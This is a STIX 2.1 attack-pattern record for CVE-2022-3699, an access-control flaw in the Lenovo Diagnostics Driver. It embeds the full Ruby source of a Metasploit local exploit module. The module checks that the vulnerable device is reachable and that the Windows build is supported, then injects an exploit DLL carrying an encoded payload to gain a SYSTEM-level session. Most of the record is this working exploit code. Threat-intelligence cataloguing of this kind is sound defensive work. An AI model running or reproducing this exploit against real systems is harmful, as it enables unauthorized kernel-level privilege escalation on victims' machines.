{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--67ba9de1-520d-4590-b9a4-44a34f01d5bb",
    "created": "2024-08-14T16:50:01.465754Z",
    "modified": "2024-08-14T16:50:01.465758Z",
    "name": "Lenovo Diagnostics Driver IOCTL memmove",
    "description": " Incorrect access control for the Lenovo Diagnostics Driver allows a low-privileged user the ability to issue device IOCTLs to perform arbitrary physical/virtual memory read/write.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2022_3699_lenovo_diagnostics_driver.rb",
            "external_id": "cve_2022_3699_lenovo_diagnostics_driver.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-3699"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/alfarom256/CVE-2022-3699/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Exploit::Local::WindowsKernel\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Lenovo Diagnostics Driver IOCTL memmove',\n          'Description' => %q{\n            Incorrect access control for the Lenovo Diagnostics Driver allows a low-privileged user the ability to\n            issue device IOCTLs to perform arbitrary physical/virtual memory read/write.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'alfarom256',    # Original PoC\n            'jheysel-r7'     # msf module\n          ],\n          'Arch' => [ ARCH_X64 ],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n          ],\n          'References' => [\n            [ 'CVE', '2022-3699' ],\n            [ 'URL', 'https://github.com/alfarom256/CVE-2022-3699/' ]\n          ],\n          'DisclosureDate' => '2022-11-09',\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [CRASH_SAFE],\n            'Reliability' => [REPEATABLE_SESSION],\n            'SideEffects' => []\n          },\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    unless session.platform == 'windows'\n      # Non-Windows systems are definitely not affected.\n      return Exploit::CheckCode::Safe\n    end\n\n    handle = open_device('\\\\\\\\.\\\\LenovoDiagnosticsDriver', 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')\n    if handle.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    session.railgun.kernel32.CloseHandle(handle)\n    CheckCode::Appears\n  end\n\n  def target_compatible?\n    version = get_version_info\n    vprint_status(\"Windows Build Number = #{version.build_number}\")\n\n    return true if version.build_number.between?(Msf::WindowsVersion::Win10_1607, Msf::WindowsVersion::Win10_22H2)\n    return true if version.build_number == Msf::WindowsVersion::Win11_21H2\n    return true if version.build_number.between?(Msf::WindowsVersion::Server2019, Msf::WindowsVersion::Server2022)\n\n    false\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    # check that the target is a compatible version of Windows (since the offsets are hardcoded) before loading the RDLL\n    unless target_compatible?\n      fail_with(Failure::NoTarget, 'The exploit does not support this target')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    elsif sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86\n      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')\n    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64\n      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')\n    end\n\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2022-3699', 'CVE-2022-3699.x64.dll'),\n      [encoded_payload.length].pack('I<') + encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-11-09",
    "x_mitre_platforms": [
        "win'"
    ]
}